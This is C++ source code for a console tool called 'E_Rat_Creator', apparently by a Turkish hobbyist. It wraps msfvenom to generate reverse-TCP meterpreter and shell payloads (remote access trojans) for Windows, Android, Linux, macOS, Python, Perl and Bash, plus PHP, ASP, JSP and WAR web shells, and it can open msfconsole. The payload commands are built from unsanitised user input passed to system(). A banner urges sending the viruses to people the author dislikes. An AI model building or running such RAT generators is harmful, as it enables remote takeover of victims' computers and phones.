#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <chrono>
#include <thread>

using namespace std;

//değişkenler

string v;
string s;
string nr;
string dns;

string ms;

string acp;

int brk = 0;

char ip[100];
char port[100];
char name[100];

char cr[200];

void logo(){

    printf("########           #####    #####   #####   \n");
    printf("#                  #    #   #   #     #     \n");
    printf("########   #####   #####    #####     #     \n");
    printf("#                  #    #   #   #     #     \n");
    printf("########           #    #   #   #     #     \n\n\n");

}

void carLogo(){
    

    printf("      ***********             \n");
    printf("           ******             \n");
    printf("  ********************        \n");
    printf(" **********************       \n");
    printf(" ***                ***       \n");

    printf("\n\n");


}

void humanLogo(){

    printf("\n\n");

    printf("  ******   \n");
    printf("  ******   \n");
    printf("  ******   \n");
    printf("  ******   \n");
    printf("    **     \n");
    printf("********** \n");
    printf("********** \n");
    printf("**  **  ** \n");
    printf("**  **  ** \n");
    printf("    **     \n");
    printf("    **     \n");
    printf("    **     \n");
    printf("********** \n");
    printf("********** \n");
    printf("**      ** \n");
    printf("**      ** \n");
    printf("**      ** \n");
    printf("**      ** \n");
    printf("**      ** \n");

}


void space(){

    printf("\n\n------------------------------------------------------------------------------------ \n\n");

}

void sleep(int x){

    this_thread::sleep_for(chrono::milliseconds(x));

}

void showLogo(){

    printf("\n\n");
    
    printf("       /########/              /#####/     /#######/   /#######/   \n");
    printf("      /#/                     /#/   /#/   /#/   /#/      /#/       \n");
    printf("     /#/                     /#/   /#/   /#/   /#/      /#/        \n");
    printf("    /########/   /######/   /#####/     /#######/      /#/         \n");
    printf("   /#/                     /#/   /#/   /#/   /#/      /#/          \n");
    printf("  /#/                     /#/   /#/   /#/   /#/      /#/           \n");
    printf(" /########/              /#/   /#/   /#/   /#/      /#/            \n");
    
    printf("\n\n");


    space();
    printf(" _____________________________      \n");
    printf("(_____________________________)     \n");
    printf(" |_______E_Rat_Creator_______|      \n");
    printf(" |                           |      \n");
    printf(" |Coder : Piçirhan           |      \n");
    printf(" |Version : 0.0.1            |      \n");
    printf(" |Relase date : 2020/9/12    |      \n");
    printf(" |Language : C/C++           |      \n");
    printf(" |Uses : Msfvenom            |      \n");
    printf(" |___________________________|      \n");
    printf("(_____________________________)     \n");

    printf("\n");

    space();
    while(acp != "y") {

    
    printf("sadece piçlere atın yaptınız virüsleri iyi insanlara zarar vermeyin\n");
    printf("We do not accept responsibility for misuse - do you accept (y/n) :");


    cin >> acp;
    
    if(acp == "n"){

        brk = 1;

        this_thread::sleep_for(chrono::milliseconds(2000));

        break;

    }

    printf("\n\n");
    
    
    
    }
}

void mainMenu(){

    logo();

    space();

    printf("1 - Computer/Phone payloads \n");
    printf("2 - Web payloads \n");
    printf("3 - Os shellcodes payloads \n");
    printf("4 - Open msfconsole \n");

    printf("\n");

    printf("99 - exit\n");

    space();

    printf("\n\n");

    while (true){

        

        printf("|--Select the menu\n");
        printf("| \n");
        printf("|-->");

        cin >> ms;

        if (ms == "1" || ms == "2" || ms == "3" || ms == "4"){


            this_thread::sleep_for(chrono::milliseconds(2000));
            break;

        }

        else if(ms == "99") {

            brk = 1;
            break;

        }
        else {

            printf("\n\n");

        }

    }

}

void selectRattype(){

    system("clear");

    logo();

    space();

    printf("1 : Windows \n");
    printf("2 : Android \n");
    printf("3 : Linux \n");
    printf("4 : Mac \n");
    printf("5 : Python \n");
    printf("6 : Perl \n");
    printf("7 : Bash \n\n");
    
    printf("99 : Exit\n");

    space();
    
    printf("\n\n");

    while (true) {

        printf("|--Select your rat type \n");
        printf("| \n");
        printf("|-->");
    
        cin >> s;
    
        if (s == "1" || s == "2" || s == "3" || s == "4" || s == "5" || s == "6" || s == "7") {

            break;

        }
        else if(s == "99"){


            brk = 1;
            break;

        
        }
        else {

            cout << "\n\nHatali secim \n\n\n";

        }

    }

}

void webpayloadSelect(){

    system("clear");

    logo();

    space();

    printf("1 : PHP \n");
    printf("2 : ASP \n");
    printf("3 : JSP \n");
    printf("4 : WAR \n");
    
    printf("99 : Exit\n");

    space();
    
    printf("\n\n");

    while (true) {

        printf("|--Select your rat type \n");
        printf("| \n");
        printf("|-->");
    
        cin >> s;
    
        if (s == "1" || s == "2" || s == "3" || s == "4") {

            break;

        }
        else if(s == "99"){
            
            brk = 1;
            break;

        
        }
        else {

            cout << "\n\nHatali secim \n\n\n";

        }

    }



}

void ipnameportSet(){

    printf ("|\n");

    printf("|--Set your IP - LHOST\n");
    printf("| \n");
    printf("|-->");

    cin >> ip;

    printf ("|\n");

    printf("|--Set your Port - LPORT\n");
    printf("| \n");
    printf("|-->");
    
    cin >> port;
    
    printf("|\n");

    printf("|--Set rat name \n");
    printf("| \n");
    printf("|-->");
    
    cin >> name;
    
    printf("|\n");

}

void setDns(){

    while(true) {


        printf("|--You are using dns (y/n)\n");
        printf("| \n");
        printf("|-->");

        cin >> dns;

        if(dns == "y" || dns == "n"){

            break;

        }
        else {

            printf("\n\n");

        }

    }

}


void cRat(){

    printf("\n\n");

    // masaüstü ratı oluşturma kısmı

    if(ms == "1") {
        
    if (s == "1"){
        
        if (dns == "y") {

            strcat(cr , "msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=");
            strcat(cr , ip);
            strcat(cr , " LPORT=");
            strcat(cr , port);
            strcat(cr , " -f exe > ./");
            strcat(cr , name);
            strcat(cr , ".exe");

            system(cr);

        }

        if (dns == "n") {
            
            strcat(cr , "msfvenom -p windows/meterpreter/reverse_tcp LHOST=");
            strcat(cr , ip);
            strcat(cr , " LPORT=");
            strcat(cr , port);
            strcat(cr , " -f exe > ./");
            strcat(cr , name);
            strcat(cr , ".exe");

            system(cr);

        }

    }

    else if (s == "2"){

        strcat(cr , "msfvenom -p android/meterpreter/reverse_tcp LHOST=");
        strcat(cr , ip);
        strcat(cr , " LPORT=");
        strcat(cr , port);
        strcat(cr , " -f apk > ./");
        strcat(cr , name);
        strcat(cr , ".apk");

        system(cr);

    }

    else if (s == "3"){

        strcat(cr , "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=");
        strcat(cr , ip);
        strcat(cr , " LPORT=");
        strcat(cr , port);
        strcat(cr , " -f elf > ./");
        strcat(cr , name);
        strcat(cr , ".elf");

        system(cr);
        

    }

    else if (s == "4"){

        strcat(cr , "msfvenom -p osx/x86/shell_reverse_tcp LHOST=");
        strcat(cr , ip);
        strcat(cr , " LPORT=");
        strcat(cr , port);
        strcat(cr , " -f macho > ./");
        strcat(cr , name);
        strcat(cr , ".macho");

        system(cr);
    }


    else if (s == "5"){

        strcat(cr , "msfvenom -p cmd/unix/reverse_python LHOST=");
        strcat(cr , ip);
        strcat(cr , " LPORT=");
        strcat(cr , port);
        strcat(cr , " -f raw > ./");
        strcat(cr , name);
        strcat(cr , ".py");

        system(cr);

    }

    else if (s == "6"){

        strcat(cr , "msfvenom -p cmd/unix/reverse_perl LHOST=");
        strcat(cr , ip);
        strcat(cr , " LPORT=");
        strcat(cr , port);
        strcat(cr , " -f raw > ./");
        strcat(cr , name);
        strcat(cr , ".pl");

        system(cr);

    }

    else if (s == "7"){

        strcat(cr , "msfvenom -p cmd/unix/reverse_bash LHOST=");
        strcat(cr , ip);
        strcat(cr , " LPORT=");
        strcat(cr , port);
        strcat(cr , " -f raw > ./");
        strcat(cr , name);
        strcat(cr , ".sh");

        system(cr);

    }

    printf("\n\nComplete ... :) Good luck \n\n");

    }

    // web payload oluşturma kısmı

    if (ms == "2") {

        if(s == "1") {

            //düzenleme yapılması gerek

            strcat(cr , "msfvenom -p php/meterpreter_reverse_tcp LHOST=");
            strcat(cr , ip);
            strcat(cr , " LPORT=");
            strcat(cr , port);
            strcat(cr , " -f raw > ./");
            strcat(cr , name);
            strcat(cr , ".php");

            system(cr);

        }

        else if (s == "2") {

            strcat(cr , "msfvenom -p windows/meterpreter/reverse_tcp LHOST=");
            strcat(cr , ip);
            strcat(cr , " LPORT=");
            strcat(cr , port);
            strcat(cr , " -f asp > ./");
            strcat(cr , name);
            strcat(cr , ".asp");

            system(cr);

        }

        else if (s == "3") {

            strcat(cr , "msfvenom -p java/jsp_shell_reverse_tcp LHOST=");
            strcat(cr , ip);
            strcat(cr , " LPORT=");
            strcat(cr , port);
            strcat(cr , " -f raw > ./");
            strcat(cr , name);
            strcat(cr , ".jsp");

            system(cr);

        }

        else if (s == "4") {

            strcat(cr , "msfvenom -p java/jsp_shell_reverse_tcp LHOST=");
            strcat(cr , ip);
            strcat(cr , " LPORT=");
            strcat(cr , port);
            strcat(cr , " -f war > ./");
            strcat(cr , name);
            strcat(cr , ".war");

            system(cr);

        }

        printf("\n\nComplete ... :) Good luck \n\n");

    }

    //Shell Code payloads

    if (ms == "3"){



    }

    //next rat selection

    nr = "r";

    while (nr != "y") {

        printf("Create next rat (y/n) :");
        cin >> nr;

        if(nr == "y") {

            brk = 0;

        }

        else if(nr == "n"){

            system("clear");
            
            brk = 1;

            break;
            
            

        }
        else {

            printf("\n\n");

        }
        

    }
}

void set(){

    ipnameportSet();

    setDns();

    cRat();

}

int main(){

    system("clear");

    showLogo();

    while (true){

        system("clear");

        if(brk == 1) {

            humanLogo();

            printf("\n\nGood bye .... \n\n");

            break;

        }

        mainMenu();

        //başlama kısmı

        if (ms == "1") {

            selectRattype();
            set();

        }

        if (ms == "2") {

            webpayloadSelect();
            set();

        }

        if (ms == "3") {



        }

        if (ms == "4") {

            system("clear");

            system("msfconsole");

        }

        if(brk == 1) {

            system("clear");

            humanLogo();

            printf("\n\nGood bye .... \n\n");

            break;

        }
        
    }
    return 0;
}
